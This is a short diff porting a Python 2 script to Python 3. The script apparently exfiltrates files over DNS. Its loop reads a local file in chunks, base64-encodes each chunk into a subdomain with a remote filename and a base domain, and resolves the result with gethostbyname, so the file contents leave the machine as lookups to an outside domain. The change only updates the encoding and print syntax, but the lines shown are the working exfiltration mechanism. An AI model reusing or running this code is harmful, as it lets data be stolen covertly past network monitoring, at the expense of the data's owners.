@@ -23,8 +23,8 @@ with open(local_filename, 'rb') as f:
     while True:
         data = f.read(chunk_size)
         if not data: break
-        domain = '.'.join([standard_b64encode(data), remote_filename, base_domain])
-        print domain
+        domain = '.'.join([standard_b64encode(data).decode('utf-8'), remote_filename, base_domain])
+        print(domain)
         try:
             gethostbyname(domain)
         except:
